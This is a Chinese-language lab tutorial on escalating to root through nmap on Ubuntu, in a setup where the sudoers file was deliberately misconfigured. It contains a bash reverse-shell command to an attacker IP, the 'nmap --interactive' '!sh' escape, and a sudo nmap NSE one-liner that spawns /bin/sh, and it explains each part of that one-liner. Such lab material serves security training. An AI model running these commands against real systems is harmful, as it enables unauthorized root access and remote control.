### NMap 指令提权

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

修改 `/etc/sudoer` 文件模拟配置错误情况

![](https://pic1.imgdb.cn/item/68d349ffc5157e1a882c164e.png)

在早期 nmap 版本中，带有交互模式,因而允许用户执行 Shell 命令 使用如下命令进入 nmap 交互模式

```sh
nmap --interactive
```

在 nmap 交互模式中 通过如下命令提权

```sh
nmap> !sh
sh-3.2# whoami
root
```

没有交互的最新方式

```sh
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

**1. `echo "os.execute('/bin/sh')" > /tmp/shell.nse`**

- `echo "os.execute('/bin/sh')"`：`echo` 命令在这里的作用是将一个字符串输出到标准输出。这个字符串是 `"os.execute('/bin/sh')"`
- `os.execute('/bin/sh')`：这是 Lua 脚本中的一个函数调用。`os.execute()` 函数用于执行一个操作系统命令。在这里，它执行的命令是 `/bin/sh`，也就是启动一个 shell
- `> /tmp/shell.nse`：这是一个重定向操作符，它将 `echo` 命令的输出内容（即 `"os.execute('/bin/sh')"` 字符串）写入到 `/tmp/shell.nse` 文件中

**2. `sudo nmap --script=/tmp/shell.nse`**

- **`sudo`**：这是最关键的部分。`sudo`（Superuser Do）命令允许普通用户以 **root** 用户的权限来执行指定的命令
- **`nmap`**：网络扫描工具。通常情况下，`nmap` 是一个功能强大的端口扫描器，但它也内置了一个脚本引擎（`NSE`, Nmap Scripting Engine）。这个引擎允许用户使用 Lua 脚本来扩展 `nmap` 的功能
- **`--script=/tmp/shell.nse`**：这个参数告诉 `nmap` 去加载并运行指定的 Lua 脚本。在这里，它加载的就是我们刚刚创建的 `/tmp/shell.nse` 文件

![](https://pic1.imgdb.cn/item/68d34e3dc5157e1a882c1863.png)
